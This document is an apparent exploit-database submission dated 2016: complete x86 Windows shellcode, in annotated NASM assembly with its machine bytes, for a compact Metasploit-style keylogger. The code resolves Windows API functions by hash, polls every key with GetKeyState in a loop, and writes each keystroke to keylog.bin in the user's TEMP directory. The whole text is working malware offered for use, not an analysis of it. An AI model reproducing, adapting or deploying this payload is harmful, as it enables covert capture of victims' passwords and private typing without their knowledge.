; Exploit Title: x86 windows shellcode - msf-golfed keylogger to file - 433 bytes
; Date: Fri Oct 28 11:44:31 GMT 2016
; Exploit Author: Fugu
; Vendor Homepage: www.microsoft.com
; Version: all win
; Tested on: Windows 7(x86), 8.1(x86), 10(x86_64)
; Note: it will write to "keylog.bin" in the users %TEMP% directory.
;       keystrokes are saved in format: "Virtual-Key Codes", from
;       msdn.microsoft.com website
section .bss

section .data

section .text
   global _start
      _start:
    cld                                          ; 00000000 FC             |.|
    call dword loc_88h                           ; 00000001 E882000000     |.....|
    pushad                                       ; 00000006 60             |`|
    mov ebp,esp                                  ; 00000007 89E5           |..|
    xor eax,eax                                  ; 00000009 31C0           |1.|
    mov edx,[fs:eax+0x30]                        ; 0000000B 648B5030       |d.P0|
    mov edx,[edx+0xc]                            ; 0000000F 8B520C         |.R.|
    mov edx,[edx+0x14]                           ; 00000012 8B5214         |.R.|
loc_15h:
    mov esi,[edx+0x28]                           ; 00000015 8B7228         |.r(|
    movzx ecx,word [edx+0x26]                    ; 00000018 0FB74A26       |..J&|
    xor edi,edi                                  ; 0000001C 31FF           |1.|
loc_1eh:
    lodsb                                        ; 0000001E AC             |.|
    cmp al,0x61                                  ; 0000001F 3C61           |<a|
    jl loc_25h                                   ; 00000021 7C02           ||.|
    sub al,0x20                                  ; 00000023 2C20           |, |
loc_25h:
    ror edi,byte 0xd                             ; 00000025 C1CF0D         |...|
    add edi,eax                                  ; 00000028 01C7           |..|
    loop loc_1eh                                 ; 0000002A E2F2           |..|
    push edx                                     ; 0000002C 52             |R|
    push edi                                     ; 0000002D 57             |W|
    mov edx,[edx+0x10]                           ; 0000002E 8B5210         |.R.|
    mov ecx,[edx+0x3c]                           ; 00000031 8B4A3C         |.J<|
    mov ecx,[ecx+edx+0x78]                       ; 00000034 8B4C1178       |.L.x|
    jecxz loc_82h                                ; 00000038 E348           |.H|
    add ecx,edx                                  ; 0000003A 01D1           |..|
    push ecx                                     ; 0000003C 51             |Q|
    mov ebx,[ecx+0x20]                           ; 0000003D 8B5920         |.Y |
    add ebx,edx                                  ; 00000040 01D3           |..|
    mov ecx,[ecx+0x18]                           ; 00000042 8B4918         |.I.|
loc_45h:
    jecxz loc_81h                                ; 00000045 E33A           |.:|
    dec ecx                                      ; 00000047 49             |I|
    mov esi,[ebx+ecx*4]                          ; 00000048 8B348B         |.4.|
    add esi,edx                                  ; 0000004B 01D6           |..|
    xor edi,edi                                  ; 0000004D 31FF           |1.|
loc_4fh:
    lodsb                                        ; 0000004F AC             |.|
    ror edi,byte 0xd                             ; 00000050 C1CF0D         |...|
    add edi,eax                                  ; 00000053 01C7           |..|
    cmp al,ah                                    ; 00000055 38E0           |8.|
    jnz loc_4fh                                  ; 00000057 75F6           |u.|
    add edi,[ebp-0x8]                            ; 00000059 037DF8         |.}.|
    cmp edi,[ebp+0x24]                           ; 0000005C 3B7D24         |;}$|
    jnz loc_45h                                  ; 0000005F 75E4           |u.|
    pop eax                                      ; 00000061 58             |X|
    mov ebx,[eax+0x24]                           ; 00000062 8B5824         |.X$|
    add ebx,edx                                  ; 00000065 01D3           |..|
    mov cx,[ebx+ecx*2]                           ; 00000067 668B0C4B       |f..K|
    mov ebx,[eax+0x1c]                           ; 0000006B 8B581C         |.X.|
    add ebx,edx                                  ; 0000006E 01D3           |..|
    mov eax,[ebx+ecx*4]                          ; 00000070 8B048B         |...|
    add eax,edx                                  ; 00000073 01D0           |..|
    mov [esp+0x24],eax                           ; 00000075 89442424       |.D$$|
    pop ebx                                      ; 00000079 5B             |[|
    pop ebx                                      ; 0000007A 5B             |[|
    popad                                        ; 0000007B 61             |a|
    pop ecx                                      ; 0000007C 59             |Y|
    pop edx                                      ; 0000007D 5A             |Z|
    push ecx                                     ; 0000007E 51             |Q|
    jmp eax                                      ; 0000007F FFE0           |..|
loc_81h:
    pop edi                                      ; 00000081 5F             |_|
loc_82h:
    pop edi                                      ; 00000082 5F             |_|
    pop edx                                      ; 00000083 5A             |Z|
    mov edx,[edx]                                ; 00000084 8B12           |..|
    jmp short loc_15h                            ; 00000086 EB8D           |..|
loc_88h:
    pop ebp                                      ; 00000088 5D             |]|
    push dword 0x3233                            ; 00000089 6833320000     |h32..|
    push dword 0x72657375                        ; 0000008E 6875736572     |huser|
    push esp                                     ; 00000093 54             |T|
    push dword 0x726774c                         ; 00000094 684C772607     |hLw&.|
    call ebp                                     ; 00000099 FFD5           |..|
    push dword 0x657461                          ; 0000009B 6861746500     |hate.|
    push dword 0x74537965                        ; 000000A0 6865795374     |heySt|
    push dword 0x4b746547                        ; 000000A5 684765744B     |hGetK|
    push esp                                     ; 000000AA 54             |T|
    push eax                                     ; 000000AB 50             |P|
    push dword 0x7802f749                        ; 000000AC 6849F70278     |hI..x|
    call ebp                                     ; 000000B1 FFD5           |..|
    push eax                                     ; 000000B3 50             |P|
    xor ecx,ecx                                  ; 000000B4 31C9           |1.|
    mov cl,0xe                                   ; 000000B6 B10E           |..|
loc_b8h:
    push ecx                                     ; 000000B8 51             |Q|
    loop loc_b8h                                 ; 000000B9 E2FD           |..|
    push ecx                                     ; 000000BB 51             |Q|
    push dword 0x504d4554                        ; 000000BC 6854454D50     |hTEMP|
    mov ecx,esp                                  ; 000000C1 89E1           |..|
    push byte +0x40                              ; 000000C3 6A40           |j@|
    push ecx                                     ; 000000C5 51             |Q|
    push ecx                                     ; 000000C6 51             |Q|
    push dword 0xddceade7                        ; 000000C7 68E7ADCEDD     |h....|
    call ebp                                     ; 000000CC FFD5           |..|
    mov edx,esp                                  ; 000000CE 89E2           |..|
    jmp dword loc_1a0h                           ; 000000D0 E9CB000000     |.....|
loc_d5h:
    push edx                                     ; 000000D5 52             |R|
    push dword 0xc48d7274                        ; 000000D6 6874728DC4     |htr..|
    call ebp                                     ; 000000DB FFD5           |..|
    xor ecx,ecx                                  ; 000000DD 31C9           |1.|
    push ecx                                     ; 000000DF 51             |Q|
    push dword 0x80                              ; 000000E0 6880000000     |h....|
    push byte +0x4                               ; 000000E5 6A04           |j.|
    push ecx                                     ; 000000E7 51             |Q|
    push byte +0x2                               ; 000000E8 6A02           |j.|
    push byte +0x4                               ; 000000EA 6A04           |j.|
    push eax                                     ; 000000EC 50             |P|
    push dword 0x4fdaf6da                        ; 000000ED 68DAF6DA4F     |h...O|
    call ebp                                     ; 000000F2 FFD5           |..|
    push eax                                     ; 000000F4 50             |P|
    push byte +0x0                               ; 000000F5 6A00           |j.|
    push dword 0x32336c65                        ; 000000F7 68656C3332     |hel32|
    push dword 0x6e72656b                        ; 000000FC 686B65726E     |hkern|
    push esp                                     ; 00000101 54             |T|
    push dword 0xdad5b06c                        ; 00000102 686CB0D5DA     |hl...|
    call ebp                                     ; 00000107 FFD5           |..|
    xchg eax,[esp+0x8]                           ; 00000109 87442408       |.D$.|
    pop eax                                      ; 0000010D 58             |X|
    pop eax                                      ; 0000010E 58             |X|
    pop eax                                      ; 0000010F 58             |X|
    push byte +0x70                              ; 00000110 6A70           |jp|
    push dword 0x65656c53                        ; 00000112 68536C6565     |hSlee|
    push esp                                     ; 00000117 54             |T|
    push eax                                     ; 00000118 50             |P|
    push dword 0x7802f749                        ; 00000119 6849F70278     |hI..x|
    call ebp                                     ; 0000011E FFD5           |..|
    xchg eax,[esp+0x4]                           ; 00000120 87442404       |.D$.|
    pop ecx                                      ; 00000124 59             |Y|
    xor ecx,ecx                                  ; 00000125 31C9           |1.|
    mov esi,ecx                                  ; 00000127 89CE           |..|
    mov cl,0x8                                   ; 00000129 B108           |..|
loc_12bh:
    push esi                                     ; 0000012B 56             |V|
    loop loc_12bh                                ; 0000012C E2FD           |..|
loc_12eh:
    xor ecx,ecx                                  ; 0000012E 31C9           |1.|
    xor esi,esi                                  ; 00000130 31F6           |1.|
    push byte +0x8                               ; 00000132 6A08           |j.|
    call dword [esp+0x24]                        ; 00000134 FF542424       |.T$$|
loc_138h:
    mov eax,esi                                  ; 00000138 89F0           |..|
    cmp al,0xff                                  ; 0000013A 3CFF           |<.|
    jnc loc_12eh                                 ; 0000013C 73F0           |s.|
    inc esi                                      ; 0000013E 46             |F|
    push esi                                     ; 0000013F 56             |V|
    call dword [esp+0x6c]                        ; 00000140 FF54246C       |.T$l|
    mov edx,esi                                  ; 00000144 89F2           |..|
    xor ecx,ecx                                  ; 00000146 31C9           |1.|
    mov cl,0x80                                  ; 00000148 B180           |..|
    and eax,ecx                                  ; 0000014A 21C8           |!.|
    xor ecx,ecx                                  ; 0000014C 31C9           |1.|
    cmp eax,ecx                                  ; 0000014E 39C8           |9.|
    jnz loc_162h                                 ; 00000150 7510           |u.|
    xor edx,edx                                  ; 00000152 31D2           |1.|
    mov ecx,edx                                  ; 00000154 89D1           |..|
    mov eax,esi                                  ; 00000156 89F0           |..|
    mov cl,0x20                                  ; 00000158 B120           |. |
    div ecx                                      ; 0000015A F7F1           |..|
    btr [esp+eax*4],edx                          ; 0000015C 0FB31484       |....|
    jmp short loc_138h                           ; 00000160 EBD6           |..|
loc_162h:
    xor edx,edx                                  ; 00000162 31D2           |1.|
    mov ecx,edx                                  ; 00000164 89D1           |..|
    mov eax,esi                                  ; 00000166 89F0           |..|
    mov cl,0x20                                  ; 00000168 B120           |. |
    div ecx                                      ; 0000016A F7F1           |..|
    bt [esp+eax*4],edx                           ; 0000016C 0FA31484       |....|
    jc loc_138h                                  ; 00000170 72C6           |r.|
    xor edx,edx                                  ; 00000172 31D2           |1.|
    mov ecx,edx                                  ; 00000174 89D1           |..|
    mov eax,esi                                  ; 00000176 89F0           |..|
    mov cl,0x20                                  ; 00000178 B120           |. |
    div ecx                                      ; 0000017A F7F1           |..|
    bts [esp+eax*4],edx                          ; 0000017C 0FAB1484       |....|
    xor ecx,ecx                                  ; 00000180 31C9           |1.|
    push esi                                     ; 00000182 56             |V|
    push ecx                                     ; 00000183 51             |Q|
    lea ecx,[esp]                                ; 00000184 8D0C24         |..$|
    push ecx                                     ; 00000187 51             |Q|
    push byte +0x1                               ; 00000188 6A01           |j.|
    lea ecx,[esp+0xc]                            ; 0000018A 8D4C240C       |.L$.|
    push ecx                                     ; 0000018E 51             |Q|
    push dword [esp+0x38]                        ; 0000018F FF742438       |.t$8|
    push dword 0x5bae572d                        ; 00000193 682D57AE5B     |h-W.[|
    call ebp                                     ; 00000198 FFD5           |..|
    lea esp,[esp+0x4]                            ; 0000019A 8D642404       |.d$.|
    jmp short loc_12eh                           ; 0000019E EB8E           |..|
loc_1a0h:
    call dword loc_d5h                           ; 000001A0 E830FFFFFF     |.0...|
    db "\keylog.bin",0                           ; 000001A5 5C6B65796C6F672E62696E00 |\keylog.bin.|

